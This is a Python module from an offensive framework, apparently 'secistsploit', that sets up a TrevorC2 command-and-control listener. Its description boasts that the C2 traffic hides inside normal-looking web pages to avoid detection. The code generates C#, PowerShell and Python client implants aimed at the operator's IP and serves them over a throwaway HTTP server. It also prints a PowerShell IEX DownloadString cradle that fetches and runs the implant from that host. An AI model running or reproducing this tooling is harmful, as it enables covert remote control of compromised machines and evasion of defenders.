# -*- coding:utf-8 -*-
from secistsploit.core.exploit.trevorc2_server import *
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient
class Exploit(TCPClient):
    __info__ = {
        "name": "listener/trevorc2",
        "\033[91m内容描述\033[0m": "trevorc2模块叙述：\n"
                        "TrevorC2是一个客户端/服务器模型，用于通过通常可浏览的网站屏蔽命令和控制。随着时间间隔的不同，检测变得更加困难，并且不会使用POST请求进行数据扩展。\n",

        "\033[91m参考链接\033[0m": (
             "https://github.com/trustedsec/trevorc2\n"
             "http://www.ggsec.cn/trevorc2.html\n"
        ),

        "\033[91m作者\033[0m": (
            "Demon",
        ),
    }
    lhost = OptIP("", "开启HTTP 填写本机IP")
    target = OptString("", "1.c#  2.powershell  3.python (栗子 => target 1)")

    def run(self):
        TARGET=(self.target)
        LHOST=(self.lhost)
        if  TARGET == "1":
            file=os.getcwd()+'/secistsploit/data/trevorc2/trevorc2_client.cs'
            cs=open("%s"%file,"r")
            cs2=open("trevorc2_client.cs","w")
            for s in cs.readlines():
                cs2.write(s.replace("127.0.0.1","%s"%LHOST))
            cs.close()
            cs2.close()
            print ("\033[92m[+]\033[0m  客户端输出路径:  "+os.getcwd()+"/trevorc2_client.cs \n")
            print ("\033[92m[+]\033[0m  \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\MSBuild\\15.0\\Bin\\Roslyn\\csc.exe\"  /target:exe /out:client.exe trevorc2_client.cs\n")
        elif TARGET== "2":
            file=os.getcwd()+'/secistsploit/data/trevorc2/trevorc2_client.ps1'
            ps=open("%s"%file,"r")
            ps2=open("trevorc2_client.ps1","w")
            for s in ps.readlines():
                ps2.write(s.replace("127.0.0.1","%s"%LHOST))
            ps.close()
            ps2.close()
            print ("\033[92m[+]\033[0m  客户端输出路径:  "+os.getcwd()+"/trevorc2_client.ps1 \n")
            os.system ("nohup python -m SimpleHTTPServer 8080  &")
            print ("\033[92m[+]\033[0m  IEX (New-Object System.Net.Webclient).DownloadString('http://%s:8080/trevorc2_client.ps1’); \n"%(LHOST))

            #print ("\033[92m[+]\033[0m  IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1’);")
        elif TARGET== "3":
            file=os.getcwd()+'/secistsploit/data/trevorc2/trevorc2_client.py'
            py=open("%s"%file,"r")
            py2=open("trevorc2_client.py","w")
            for s in py.readlines():
                py2.write(s.replace("127.0.0.1","%s"%LHOST))
            py.close()
            py2.close()
            print ("\033[92m[+]\033[0m  客户端输出路径:  "+os.getcwd()+"/trevorc2_client.py \n")
        TrevorC2()
